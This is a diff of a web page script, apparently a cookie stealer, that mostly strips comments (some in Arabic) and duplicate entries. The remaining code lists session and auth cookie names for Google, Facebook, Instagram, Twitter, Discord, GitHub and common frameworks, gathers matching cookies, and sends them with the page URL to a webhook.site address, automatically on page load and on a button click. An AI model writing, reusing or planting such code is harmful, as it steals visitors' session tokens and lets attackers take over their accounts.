@@ -12,33 +12,19 @@
 <script>
     const webhookUrl = "https://webhook.site/5aaa35a1-60e4-4b7f-953e-10a3078c0436";
 
-    // القائمة الشاملة لأسماء ملفات تعريف الارتباط المطلوبة
     const SESSION_COOKIE_NAMES = new Set([
-        // Generic session identifiers
         "sessionid", "session_token", "session_id", "session", "sid",
         "connect.sid", "login_info", "logged_in",
-        // Auth / token
         "auth_token", "access_token", "token", "oauth_token",
         "id_token", "refresh_token", "bearer_token",
-        // Google
         "apisid", "sapisid", "hsid", "ssid", "lsid",
-        "sid",
-        // Facebook / Meta
         "c_user", "datr", "xs", "fr", "sb",
-        // Instagram
         "ds_user_id", "csrftoken", "rur", "mid",
-        // Twitter / X
-        "auth_token", "ct0", "twid",
-        // Discord
+        "ct0", "twid",
         "locale", "dcfduid", "sdcfduid",
-        // GitHub
         "_gh_sess", "user_session", "dotcom_user",
-        // Kick
         "kick_session_id",
-        // PHP / Java legacy
-        "phpsessid", "jsessionid",
-        // Generic web frameworks
-        "user_session", "_session_id", "remember_token",
+        "phpsessid", "jsessionid", "_session_id", "remember_token",
         "remember_user_token", "remember_web"
     ]);
 
@@ -61,7 +47,6 @@
     function sendData() {
         const extractedCookies = getTargetCookies();
         
-        // تجهيز البيانات كاملة بصيغة JSON وتشفيرها لضمان وصولها عبر الـ Webhook بدون أخطاء CORS
         const payload = encodeURIComponent(JSON.stringify({
             url: window.location.href,
             cookies: extractedCookies,
@@ -74,7 +59,6 @@
         console.log("تم إرسال الطلب بنجاح");
     }
 
-    // إرسال تلقائي عند تحميل الصفحة وعند الضغط على الزر
     window.addEventListener("DOMContentLoaded", () => {
         sendData();
         const btn = document.getElementById("btn");
